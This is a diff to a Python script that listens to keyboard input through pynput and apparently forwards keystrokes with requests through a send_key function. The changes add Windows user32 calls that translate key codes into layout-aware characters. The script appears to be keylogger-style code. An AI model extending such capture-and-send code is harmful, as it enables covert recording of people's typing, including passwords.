@@ -1,8 +1,10 @@
 
+import ctypes
+import sys
 import threading
 import time
-from queue import Queue, Empty
 from datetime import datetime, timedelta
+from queue import Empty, Queue
 from typing import List, Optional
 
 import requests
@@ -19,8 +21,69 @@ def send_key(key: str):
     except Exception:
         pass
 
+_user32 = None
+if sys.platform == "win32":
+    _user32 = ctypes.WinDLL("user32", use_last_error=True)
+
+
+def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
+    if _user32 is None:
+        return None
+
+    vk = getattr(key_code, "vk", None)
+    if vk is None:
+        return None
+
+    scan_code = _user32.MapVirtualKeyW(vk, 0)
+    if scan_code == 0:
+        return None
+
+    keyboard_state = (ctypes.c_uint8 * 256)()
+    for virtual_key in range(256):
+        keyboard_state[virtual_key] = _user32.GetKeyState(virtual_key) & 0xFF
+
+    buffer = ctypes.create_unicode_buffer(8)
+    layout = _user32.GetKeyboardLayout(0)
+    result = _user32.ToUnicodeEx(
+        vk,
+        scan_code,
+        keyboard_state,
+        buffer,
+        len(buffer),
+        0,
+        layout,
+    )
+
+    if result == -1:
+        _user32.ToUnicodeEx(
+            vk,
+            scan_code,
+            keyboard_state,
+            buffer,
+            len(buffer),
+            0,
+            layout,
+        )
+        return None
+
+    if result > 0:
+        return buffer.value[:result]
+
+    return None
+
+
 def key_to_str(key):
-    if key in {keyboard.Key.shift, keyboard.Key.shift_r}:
+    if key in {
+        keyboard.Key.shift,
+        keyboard.Key.shift_r,
+        keyboard.Key.alt,
+        keyboard.Key.alt_gr,
+        keyboard.Key.alt_l,
+        keyboard.Key.alt_r,
+        keyboard.Key.ctrl,
+        keyboard.Key.ctrl_l,
+        keyboard.Key.ctrl_r,
+    }:
         return None
     if key == keyboard.Key.caps_lock:
         return "{caps_lock}"
@@ -35,7 +98,11 @@ def key_to_str(key):
     if key == keyboard.Key.esc:
         return "{escape}"
     if isinstance(key, keyboard.KeyCode):
-        return key.char
+        if key.char is not None:
+            return key.char
+        translated = _translate_keycode_windows(key)
+        if translated:
+            return translated
     return None
 
 def worker(q: Queue):
